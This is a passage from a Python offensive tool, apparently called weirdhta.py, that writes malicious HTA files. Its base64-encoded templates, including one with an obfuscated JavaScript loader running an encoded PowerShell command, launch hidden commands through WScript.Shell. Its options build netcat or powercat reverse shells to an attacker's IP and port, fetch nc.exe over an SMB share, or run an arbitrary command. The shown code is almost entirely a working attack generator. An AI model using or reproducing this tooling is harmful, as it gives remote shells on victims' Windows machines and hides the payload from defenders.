weDIxNDRlNTt9fTpmdW5jdGlvbigpe307XzB4M2ZhNTg1PSFbXTtyZXR1cm4gXzB4MWRlYjI0O307fSgpOyhmdW5jdGlvbigpe18weDJiZjVjOCh0aGlzLGZ1bmN0aW9uKCl7dmFyIF8weDE3MTVjNj1uZXcgUmVnRXhwKF8weDQ4NjcoJzB4MScsJ3h2OUgnKSk7dmFyIF8weDJlMDY4Nz1uZXcgUmVnRXhwKF8weDQ4NjcoJzB4MicsJzN0U20nKSwnaScpO3ZhciBfMHgyNjc3OWM9XzB4MTI3ZThlKF8weDQ4NjcoJzB4MycsJyNGTl4nKSk7aWYoIV8weDE3MTVjNlsndGVzdCddKF8weDI2Nzc5YytfMHg0ODY3KCcweDQnLCdMNE0wJykpfHwhXzB4MmUwNjg3W18weDQ4NjcoJzB4NScsJ1p4elInKV0oXzB4MjY3NzljK18weDQ4NjcoJzB4NicsJ1p4elInKSkpe18weDI2Nzc5YygnMCcpO31lbHNle18weDEyN2U4ZSgpO319KSgpO30oKSk7YVtfMHg0ODY3KCcweDcnLCdmMnZeJyldKCdwb3dlcnNoZWxsXHgyMC1ub3BceDIwLXdceDIwMVx4MjAtZW5jXHgyMEJBU0U2NCcsMHgwKTt3aW5kb3dbXzB4NDg2NygnMHg4JywnNiNyYicpXSgpO2Z1bmN0aW9uIF8weDEyN2U4ZShfMHgzMzVhYzcpe2Z1bmN0aW9uIF8weDI1YTUwYihfMHgzNjI5MjQpe2lmKHR5cGVvZiBfMHgzNjI5MjQ9PT1fMHg0ODY3KCcweDknLCczdFNtJykpe3JldHVybiBmdW5jdGlvbihfMHg0YTNmNjEpe31bXzB4NDg2NygnMHhhJywnXkZ0SycpXShfMHg0ODY3KCcweGInLCdUT3ZuJykpWydhcHBseSddKF8weDQ4NjcoJzB4YycsJ25zUG0nKSk7fWVsc2V7aWYoKCcnK18weDM2MjkyNC9fMHgzNjI5MjQpW18weDQ4NjcoJzB4ZCcsJyNLSXYnKV0hPT0weDF8fF8weDM2MjkyNCUweDE0PT09MHgwKXsoZnVuY3Rpb24oKXtyZXR1cm4hIVtdO31bJ2NvbnN0cnVjdG9yJ10oXzB4NDg2NygnMHhlJywnMyZqUicpK18weDQ4NjcoJzB4ZicsJ1plRzQnKSlbJ2NhbGwnXSgnYWN0aW9uJykpO31lbHNleyhmdW5jdGlvbigpe3JldHVybiFbXTt9Wydjb25zdHJ1Y3RvciddKF8weDQ4NjcoJzB4MTAnLCcmIVpNJykrXzB4NDg2NygnMHgxMScsJ1FXI1knKSlbXzB4NDg2NygnMHgxMicsJ29CVXgnKV0oJ3N0YXRlT2JqZWN0JykpO319XzB4MjVhNTBiKCsrXzB4MzYyOTI0KTt9dHJ5e2lmKF8weDMzNWFjNyl7cmV0dXJuIF8weDI1YTUwYjt9ZWxzZXtfMHgyNWE1MGIoMHgwKTt9fWNhdGNoKF8weDMxM2UzMSl7fX0KPC9zY3JpcHQ+Cjx0aXRsZT5XZWlyZCBUaXRsZTwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CjxoMT5XRUlSRCBIVEE8L2gxPgo8aHI+CjwvYm9keT4KPC9odG1sPgoK"
        hta_plain = base64.b64decode(hta_b64).decode()
        hta = hta_plain.replace("BASE64", payload)
        with open("fela.hta", 'w', encoding = 'utf-8') as f:
            f.write(hta)
            f.close()
        print("[*] Written fela.hta")

    def hta_smb(payload, fname):
        hta_b64 = "PGh0bWw+CjxoZWFkPgoKPEhUQTpBUFBMSUNBVElPTiBpZD0id2VpcmRodGEiCmFwcGxpY2F0aW9uTmFtZT0id2VpcmRodGEiCmJvcmRlcj0idGhpbiIKYm9yZGVyU3R5bGU9Im5vcm1hbCIKY2FwdGlvbj0ieWVzIgppY29uPSJodHRwOi8vMTI3LjAuMC4xL2Zhdmljb24uaWNvIgptYXhpbWl6ZUJ1dHRvbj0ieWVzIgptaW5pbWl6ZUJ1dHRvbj0ieWVzIgpzaG93SW5UYXNrYmFyPSJubyIKd2luZG93U3RhdGU9Im5vcm1hbCIKaW5uZXJCb3JkZXI9InllcyIKbmF2aWdhYmxlPSJ5ZXMiCnNjcm9sbD0iYXV0byIKc2Nyb2xsRmxhdD0ieWVzIgpzaW5nbGVJbnN0YW5jZT0ieWVzIiAKc3lzTWVudT0ieWVzIgpjb250ZXh0TWVudT0ieWVzIgpzZWxlY3Rpb249InllcyIgCnZlcnNpb249IjEuMCIgLz4KCjxzY3JpcHQ+CmE9bmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTsKYS5ydW4oIkNNREhFUkUiLCAwKTt3aW5kb3cuY2xvc2UoKTsKPC9zY3JpcHQ+Cjx0aXRsZT5XZWlyZCBUaXRsZTwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CjxoMT5XRUlSRCBIVEE8L2gxPgo8aHI+CjwvYm9keT4KPC9odG1sPgoK"
        hta_plain = base64.b64decode(hta_b64).decode()
        hta = hta_plain.replace("CMDHERE", payload)
        with open(fname, 'w', encoding = 'utf-8') as f:
            f.write(hta)
            f.close()
        print(f"[*] Written {fname}")

    def custom_hta(payload):
        hta_b64 = "PGh0bWw+CjxoZWFkPgoKPEhUQTpBUFBMSUNBVElPTiBpZD0id2VpcmRodGEiCmFwcGxpY2F0aW9uTmFtZT0id2VpcmRodGEiCmJvcmRlcj0idGhpbiIKYm9yZGVyU3R5bGU9Im5vcm1hbCIKY2FwdGlvbj0ieWVzIgppY29uPSJodHRwOi8vMTI3LjAuMC4xL2Zhdmljb24uaWNvIgptYXhpbWl6ZUJ1dHRvbj0ieWVzIgptaW5pbWl6ZUJ1dHRvbj0ieWVzIgpzaG93SW5UYXNrYmFyPSJubyIKd2luZG93U3RhdGU9Im5vcm1hbCIKaW5uZXJCb3JkZXI9InllcyIKbmF2aWdhYmxlPSJ5ZXMiCnNjcm9sbD0iYXV0byIKc2Nyb2xsRmxhdD0ieWVzIgpzaW5nbGVJbnN0YW5jZT0ieWVzIiAKc3lzTWVudT0ieWVzIgpjb250ZXh0TWVudT0ieWVzIgpzZWxlY3Rpb249InllcyIgCnZlcnNpb249IjEuMCIgLz4KCjxzY3JpcHQ+CmE9bmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTsKYS5ydW4oIkNNREhFUkUiLCAwKTt3aW5kb3cuY2xvc2UoKTsKPC9zY3JpcHQ+Cjx0aXRsZT5XZWlyZCBUaXRsZTwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CjxoMT5XRUlSRCBIVEE8L2gxPgo8aHI+CjwvYm9keT4KPC9odG1sPgoK"
        hta_plain = base64.b64decode(hta_b64).decode()
        hta = hta_plain.replace("CMDHERE", payload)
        with open("fela.hta", 'w', encoding = 'utf-8') as f:
            f.write(hta)
            f.close()
        print(f"[*] Written fela.hta")
        
    if args.powercat:
        payload = nc_shell(args.ip, args.port)
        hta(payload)

    elif args.smb:
        share = input("[*] Enter your share name : ")
        fname = "nc.exe"
        payload = smb_shell(args.ip, share, fname)
        fname = "download_nc.hta"
        hta_smb(payload, fname)
        payload = smb_exec(args.ip, args.port)
        fname = "run.hta"
        hta_smb(payload, fname)
        print("[*] Please install impacket")
        print(f"[*] python smbserver.py {share} . -smb2support")

    elif args.normal:
        payload = reverse_shell(args.ip, args.port)
        hta(payload)

    elif args.obfuscator:
        payload = reverse_shell(args.ip, args.port)
        hta_encrypt(payload)

    elif args.command:
        payload = custom_command(args.command)
        print(payload)
        custom_hta(payload)

    elif args.golang:
        payload = go(args.ip, args.port)
        print(payload)
    else:
        sys.exit("[*] python3 weirdhta.py -h")

if __name__ == "__main__":
    Main()
